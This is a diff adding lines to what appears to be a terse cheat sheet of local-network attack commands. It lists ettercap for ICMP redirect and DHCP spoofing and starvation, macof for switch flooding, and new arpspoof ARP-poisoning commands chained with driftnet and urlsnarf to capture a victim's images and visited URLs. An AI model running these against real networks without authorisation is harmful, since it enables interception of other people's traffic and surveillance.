@@ -20,3 +20,8 @@ icmp redirect : ettercap -G
 dhcp spoofing : ettercap -G
 dhcp starvation : etttercap -G 
 macof : macof -i <interface> 
+
+
+
+driftnet : arpspoof -i wlan0 -t <ip> <ip>   //     driftnet -i wlan0 -v
+urlsnarf : arpspoof -i wlan0 -t <ip> <ip>   //     urlsnarf -i wlan0 -p pcapfile
